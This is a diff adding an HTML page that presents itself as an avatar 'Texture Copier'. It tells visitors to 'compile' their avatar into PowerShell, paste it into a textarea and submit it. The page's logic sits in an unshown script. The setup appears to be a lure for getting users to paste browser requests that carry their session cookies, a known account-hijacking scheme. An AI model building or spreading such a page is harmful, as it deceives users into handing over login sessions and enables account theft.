@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Texture Copier - ReCompiler</title>
+  <link rel="stylesheet" href="style.css">
+  <link rel="icon" href="favicon.ico">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins&display=swap" rel="stylesheet">
+</head>
+<body>
+  <div class="container">
+    <img src="logo.png" alt="Texture Compiler Logo" class="logo">
+
+    <!-- 📢 Updated description text with id for JS -->
+    <div class="description-text" id="instructions">
+      Press on the "Compile PowerShell" button to compile your avatar. Once you have your PowerShell copied, you can paste it and hit "Enter" to send it.
+    </div>
+
+    <div class="video-section">
+      <!-- Removed YouTube logo section -->
+      <div class="tutorial-video">
+        <iframe width="560" height="315" src="https://www.youtube.com/embed/l8y4M_qgmVg?modestbranding=1" 
+          title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
+          allowfullscreen></iframe>
+      </div>
+
+      <!-- Button for entering PowerShell data -->
+      <div class="compile-avatar-button">
+        <button id="enterButton" class="compile-button">Compile PowerShell</button>
+      </div>
+    </div>
+
+    <div id="output" class="output"></div>
+
+    <!-- Footer Buttons -->
+    <div class="footer-buttons">
+      <button class="footer-btn" onclick="openModal('faq')">FAQ</button>
+      <div class="divider"></div>
+      <button class="footer-btn" onclick="openModal('about')">About</button>
+      <div class="divider"></div>
+      <button class="footer-btn" onclick="openModal('tos')">TOS</button>
+    </div>
+  </div>
+
+  <!-- Modal -->
+  <div id="modal" class="modal">
+    <div class="modal-content">
+      <span class="close" onclick="closeModal()">&times;</span>
+      <h2 id="modal-title"></h2>
+      <p id="modal-text"></p>
+      <!-- PowerShell input area, hidden by default -->
+      <textarea id="powershellInput" style="display:none; width:100%; height:120px; border-radius:8px; padding:12px; font-size:1rem;" placeholder="Enter Powershell here"></textarea>
+      <button id="submitButton" style="display:none; margin-top:12px;">Enter</button>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
